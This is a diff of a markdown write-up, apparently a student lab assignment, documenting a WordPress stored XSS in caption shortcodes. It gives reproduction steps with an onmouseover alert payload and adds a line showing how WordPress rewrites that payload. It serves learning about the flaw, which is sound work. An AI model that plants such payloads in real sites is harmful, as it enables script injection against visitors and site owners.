@@ -33,9 +33,10 @@ Time spent: **X** hours spent in total
   - [ ] Steps to recreate: 
     - Create a user with posting privileges. Create a new post and eneter the code below into the post's text editor, rather than the visual editor. Publish and view the post.
     - ```<a href="[caption code=">]</a><a title=" onmouseover=alert('XSS')  ">link</a>```
+    - Wordpress changes the test to ```<a href="&lt;/a&gt;&lt;a title=" onmouseover="alert('XSS')" "="">link</a>```
   
   - [ ] Affected source code:
-    - [Changeset 33359(https://core.trac.wordpress.org/changeset/33359)
+    - [Changeset 33359](https://core.trac.wordpress.org/changeset/33359)
     
 3. (Required) Vulnerability Name or ID
   - [ ] Summary: 
